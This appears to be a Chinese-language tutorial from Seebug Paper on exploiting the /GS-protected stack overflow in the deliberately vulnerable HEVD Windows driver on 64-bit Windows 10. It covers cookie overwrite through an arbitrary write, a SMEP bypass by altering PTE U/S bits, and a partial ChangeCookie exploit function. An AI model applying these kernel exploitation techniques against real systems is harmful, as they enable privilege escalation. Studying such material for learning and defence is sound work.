**作者：zoemurmure  
原文链接：  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：PI:EMAIL **
# 0\. 前言
[HackSys Extreme Vulnerable Driver
(HEVD)](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
是出于学习内核的漏洞利用技巧而开发的具有多个漏洞的 Windows 驱动程序。本文介绍了 Windows 10 64 位环境下如何绕过带有 /GS
保护措施的栈溢出漏洞，涉及 SMEP 和 /GS
两个保护措施。文章中仅贴出部分代码，完整代码见：
# 1\. 目标函数
TriggerBufferOverflowStackGS
    __int64 __fastcall TriggerBufferOverflowStackGS(void *src, unsigned __int64 Size)
    {
      char dst[512]; // [rsp+20h] [rbp-238h] BYREF
      memset(dst, 0, sizeof(dst));
      ProbeForRead(src, 0x200ui64, 1u);
      DbgPrintEx(0x4Du, 3u, "[+] UserBuffer: 0x%p\n", src);
      DbgPrintEx(0x4Du, 3u, "[+] UserBuffer Size: 0x%X\n", Size);
      DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer: 0x%p\n", dst);
      DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer Size: 0x%X\n", 512i64);
      DbgPrintEx(0x4Du, 3u, "[+] Triggering Buffer Overflow in Stack (GS)\n");
      memmove(dst, src, Size);
      return 0i64;
    }
# 2\. 保护措施：/GS protection^[2]^
## 2.1 介绍
F5 生成的伪代码和 StackOverflow 相同，但直接从汇编代码看，可以看到函数的开头和结尾多了两端代码：
    PAGE:00000001400866E0 48 89 5C 24 18                mov     [rsp+arg_10], rbx
    PAGE:00000001400866E5 56                            push    rsi
    PAGE:00000001400866E6 57                            push    rdi
    PAGE:00000001400866E7 41 54                         push    r12
    PAGE:00000001400866E9 41 56                         push    r14
    PAGE:00000001400866EB 41 57                         push    r15
    PAGE:00000001400866ED 48 81 EC 30 02 00 00          sub     rsp, 230h
    PAGE:00000001400866F4 48 8B 05 05 C9 F7 FF          mov     rax, cs:__security_cookie
    PAGE:00000001400866FB 48 33 C4                      xor     rax, rsp
    PAGE:00000001400866FE 48 89 84 24 20 02 00 00       mov     [rsp+258h+var_38], rax
    PAGE:00000001400867D6
    PAGE:00000001400867D6                               loc_1400867D6:
    PAGE:00000001400867D6 8B C3                         mov     eax, ebx
    PAGE:00000001400867D8 48 8B 8C 24 20 02 00 00       mov     rcx, [rsp+258h+var_38]
    PAGE:00000001400867E0 48 33 CC                      xor     rcx, rsp        ; StackCookie
    PAGE:00000001400867E3 E8 28 A9 F7 FF                call    __security_check_cookie
    PAGE:00000001400867E8 48 8B 9C 24 70 02 00 00       mov     rbx, [rsp+258h+arg_10]
    PAGE:00000001400867F0 48 81 C4 30 02 00 00          add     rsp, 230h
    PAGE:00000001400867F7 41 5F                         pop     r15
    PAGE:00000001400867F9 41 5E                         pop     r14
    PAGE:00000001400867FB 41 5C                         pop     r12
    PAGE:00000001400867FD 5F                            pop     rdi
    PAGE:00000001400867FE 5E                            pop     rsi
    PAGE:00000001400867FF C3                            retn
系统使用全局 securit_cookie 对 rsp 的数值进行异或并保存在了栈中，栈中数值的大致位置如下：
    +-+-+-+-+-+-+-+-+-+-+-+-+
    |       variables       |
    +-+-+-+-+-+-+-+-+-+-+-+-+
    | xored security_cookie |
    +-+-+-+-+-+-+-+-+-+-+-+-+
    |    saved registers    |
    +-+-+-+-+-+-+-+-+-+-+-+-+
    |    return address     |
    +-+-+-+-+-+-+-+-+-+-+-+-+
    | function's arguments  |
    +-+-+-+-+-+-+-+-+-+-+-+-+
因此如果想要通过栈溢出的方式修改返回地址的数值，保存的 xored security_cookie 会首先被修改，导致无法通过
`__security_check_cookie` 的检查。而 security_cookie
的数值会在每次使用时随机生成，如果随机算法没有问题，攻击者就没有办法预测出该数值，无法再通过之前的方法对栈溢出漏洞进行攻击。
`__security_check_cookie` 的检查会检查两个部分，首先是 xored security_cookie 再次和 RSP
异或之后是否和最初的 security_cookie 一致，其次是该数值的高16位是否是 0：
    void __cdecl _security_check_cookie(uintptr_t StackCookie)
    {
      __int64 v1; // rcx
      if ( StackCookie != _security_cookie )
    ReportFailure:
        _report_gsfailure(StackCookie);
      v1 = __ROL8__(StackCookie, 16);
      if ( (_WORD)v1 )
      {
        StackCookie = __ROR8__(v1, 16);
        goto ReportFailure;
      }
    }
通过在 IDA 中查找，发现 security_cookie 由函数 `_security_init_cookie` 生成，并最终保存在 .data
段的起始位置。
    .data:0000000140003000   ; Segment permissions: Read/Write
    .data:0000000140003000   _data           segment para public 'DATA' use64
    .data:0000000140003000                   assume cs:_data
    .data:0000000140003000                   ;org 140003000h
    .data:0000000140003000   ; uintptr_t _security_cookie
    .data:0000000140003000   __security_cookie dq 2B992DDFA232h      ; DATA XREF: __security_check_cookie↑r
## 2.2 绕过方法
1.SEH
在之前学习的普通程序栈溢出利用方法中，提到过利用 SEH 实现漏洞利用，通过修改 SEH 中的 exception handler
地址并触发异常来控制程序的执行流程。但是这个方法在这里并不可行，因为这次的测试环境是 64 位系统，而只有 32 位系统的 SEH 信息保存在栈中，64
位系统的 SEH 信息保存在一个表中，表的地址保存在 PE 头[3]。因此无法使用 SEH 进行漏洞利用。
2.security_cookie 数值猜测
我决定不在 Windows 10 上浪费这个时间了。
3.修改 .data 和 栈上存储的 cookie 值
要做到这点，需要找到一个任意写漏洞，而 HEVD 显然是有这个漏洞的，就在 `TriggerArbitraryWrite`
函数中。除此之外，此次漏洞函数中还额外对 security_cookie 进行了一次栈顶的异或操作，因此还要获取栈顶的数值，和下面的方法 5 类似。
4.覆盖虚函数指针
条件：①函数参数中有对象或结构体的指针；②参数是放在栈上的。由于测试环境是 64 位系统，参数保存在寄存器中，因此不考虑。
5.读取 cookie 数值并计算出 xored security_cookie 数值
需要一个任意读漏洞读取 cookie 的数值，以及想办法获取计算 xored security_cookie 时 RSP
寄存器的数值。文章[1]使用了这个方法，并且用了一个限制条件很严格的方法获取到了 RSP 寄存器的数值。
此次学习过程会尝试使用方法 3/5 实现漏洞利用，方法 5 在文章[1]中实现时使用了 HEVD 的任意写漏洞实现任意读来读取 cookie
数值，这里在实现时直接按照方法 3，利用任意写漏洞修改 .data 段的 cookie 数值，之后获取 RSP 数值的方法参照文章[1]实现，但是
**进行了一些修改** ，修改原因见下面的详细分析。目前还没有找到其他在 X64 系统上绕过 /GS 的方法，如果有资料的话欢迎联系我。
# 3\. 保护措施：SMEP
## 3.1 介绍
见 
## 3.2 绕过方法
如果系统开启了 Hyper-V，Virtualization-Based Security(VBS) 中的 Hyper Guard 功能会阻止对于 CR4
寄存器的修改[5]，导致修改 CR4 寄存器的方法无法实现漏洞利用。
文章[1]使用了一个新的绕过方法，修改 shellcode 所在页的 PTE 结构[7]中的 U/S 字段，将其设置为 Supervisor 状态，这样
SMEP 的保护就不会生效。
# 4\. 实现
## 4.1 需要实现的功能
  1. 修改 HEVD.SYS .data 段中保存的 security_cookie 数值； 
  2. 修改 shellcode 所在页 PTE 中的 U/S 字段数值； 
  3. 获取漏洞发生时的栈顶数值 
## 4.2 整体流程
获取 HEVD.sys 的基地址 → 获取 HEVD.sys 的 .data 段地址 → 修改 .data 段的 cookie 值 →
为 shellcode 分配空间 → 获取空间所在页 PTE 地址 → 修改 PTE 的 U/S 字段 → 清空 TLB 缓存
内核栈空间地址泄露 → 设置栈空间锚点 → 搜索锚点 → RSP 计算
覆盖栈溢出缓冲区
## 4.3 /GS 绕过 方法
### 4.3.1 修改 .data 段 cookie 数值
这部分比较简单，代码如下，完整代码见github：
    ULONGLONG ChangeCookie() {
        /*
        通过重写 .data 段中的 cookie 值来绕过 /BS 防御机制。
        返回值是覆盖后的 cookie 值，方便在溢出时进行插入，并与其他绕过方法兼容。
        */
        // 获得 HEVD 基址
        ULONGLONG hevdBaseAddr = GetDriverBase("HEVD.sys");
        if (hevdBaseAddr == 0) {
            printf("[-] Fatal: Error getting base address of HEVD.sys\n");
            return 0;
        }
        // 获得 .data 段基址
        ULONGLONG dataBase = 0, dataSize = 0;
        GetSectionAddr(hevdBaseAddr, ".data", &dataBase, &dataSize);
        //DWORD hevdDataSecOffset = GetDataSectionOffset(hevdFilePath);
        if (dataBase == 0) {
            printf("[-] Fatal: Error getting data section offset\n");
            return 0;
        }